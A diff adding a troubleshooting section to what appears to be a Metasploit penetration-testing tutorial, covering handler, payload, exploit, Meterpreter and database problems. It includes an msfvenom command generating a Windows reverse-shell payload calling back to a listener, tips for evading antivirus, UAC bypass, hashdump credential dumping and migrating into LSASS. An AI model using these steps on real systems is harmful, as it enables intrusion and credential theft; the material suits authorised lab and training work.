@@ -2619,24 +2619,95 @@ meterpreter > execute -f C:\\Windows\\Temp\\second_payload.exe -H
 
 
 
+# 11. Troubleshooting
+
+- This section covers common problems and their solutions. When things don't work, check here first.
+
+---
+
+### 1. Handler Issues
+
+| Problem | Likely Cause | Solution |
+|---------|--------------|----------|
+| Payload runs but no session | Wrong LHOST or firewall blocking | Set LHOST to correct IP (use `ip a` to check). Ensure no firewall blocking your port |
+| "Connection refused" | No listener running | Start handler before running payload |
+| Session drops immediately | Unstable payload or network | Try a different payload type (stageless, reverse_https) |
+| Multiple sessions not working | `ExitOnSession` is true | Set `ExitOnSession false` |
+| Handler sees connection but no session | Payload architecture mismatch | Check if target is 32-bit vs 64-bit. Use correct payload |
+
+**Example: Check if your port is open**
+```bash
+netstat -tulpn | grep 4444
+```
+
+## 2. Payload Generation Problems
+|Problem|	Likely Cause	|Solution|
+|----|----|----|
+|"Payload failed to load"	|Wrong payload name	|Check show payloads for correct syntax|
+|Payload crashes target|	Over-encoding or incompatible|	Use fewer iterations (-i 1), try different payload|
+|Antivirus detects payload instantly	|Basic encoding not enough|	Use stageless payload, custom template, or different encoder|
+|Payload won't execute on target|	Missing dependencies (e.g., .NET Framework)|	Use a different payload that doesn't require the missing dependency|
+
+- **Test if your payload works:**
+  ```bash
+  # Generate test payload
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o test.exe
+
+  * Run on your own VM. Check handler. If it works, your setup is correct.
+  ```
 
 
+## 3. Exploit Issues
+|Problem	|Likely Cause|	Solution|
+|----|----|----|
+|"Exploit completed, but no session"	|Payload didn't connect	|Check LHOST, LPORT, firewall|
+|"Target is not vulnerable"|	Patch has been applied|	Find a different exploit or vector|
+|Exploit crashes target	|Wrong target type or version|	Use show targets and select correct target number|
+|"The target appears to be down"	|Target IP is wrong or target offline	|Double-check IP with ping|
+|"This exploit is not supported on this platform"	|Wrong exploit for the OS	|Use search platform:windows to find compatible exploits|
+
+- **Example: Verify target is up**
+```bash
+ping -c 3 192.168.1.10
+```
+
+- Example: Check if port is open
+```bash
+nc -zv 192.168.1.10 445
+```
 
 
+## 4. Meterpreter Issues
+|Problem|	Likely Cause	|Solution|
+|----|----|----|
+|'getsystem' fails	|UAC blocking	|Use UAC bypass exploit first|
+|'hashdump' fails|	Memory access denied	|Run getsystem first, or migrate to LSASS (migrate -P lsass.exe)|
+|Session freezes or disconnects	|Network instability	|Use reverse_https which is more stable through firewalls|
+|"Meterpreter is not in the correct session"|	Wrong session type|	Not all sessions are Meterpreter. Use sessions -l to see types|
+|Can't upload/download files	|Path issues or permissions|Use full paths: upload /local/file C:\\Windows\\Temp\\|
 
+- **Example: Migrate to a stable process**
+```bash
+meterpreter > ps | grep lsass
+2528   lsass.exe
+meterpreter > migrate 2528
+[*] Migrating to 2528...
+[*] Migration completed successfully
+```
 
+## 5. Database Issues
+|Problem|	Likely Cause|	Solution|
+|----|----|----|
+|"Database not connected"	|PostgreSQL not running	|sudo systemctl start postgresql|
+|"Cannot import scan"|	Wrong file format	|Use db_import -h to see supported formats|
+|Workspace not saving	|Database disconnected	|db_connect before creating workspace|
+|"Connection refused" on import|	File permissions	|chmod 644 scan.xml|
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+- **Example: Reconnect database**
+  ```bash
+  msf6 > db_connect
+  msf6 > db_status
+  [*] Connected to msf.
+  ```
+  
 
